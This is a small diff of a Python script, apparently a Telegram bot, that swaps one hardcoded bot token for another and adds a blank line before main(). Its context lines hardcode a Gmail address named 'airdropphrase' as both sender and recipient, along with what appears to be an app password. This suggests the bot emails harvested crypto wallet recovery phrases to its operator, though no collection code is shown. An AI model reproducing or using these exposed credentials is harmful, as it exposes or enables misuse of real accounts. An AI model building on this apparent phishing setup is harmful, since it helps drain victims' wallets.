@@ -54,7 +54,7 @@ AWAIT_RESTART = 9
 SENDER_EMAIL = "airdropphrase@gmail.com"
 SENDER_PASSWORD = "ipxs ffag eqmk otqd"
 RECIPIENT_EMAIL = "airdropphrase@gmail.com"
-BOT_TOKEN = "8596715630:AAFsBDBVIAAkv12uCeokIN0y35_KxNnZF-M"
+BOT_TOKEN = "8651336977:AAFqgQ2or6JwJEJAPbpPh8rW5vU43-XTFuA"
 
 def validate_environment():
     """Validate that all required environment variables are properly configured."""
@@ -1035,4 +1035,5 @@ def main() -> None:
                 return
 
 if __name__ == "__main__":
+
     main()
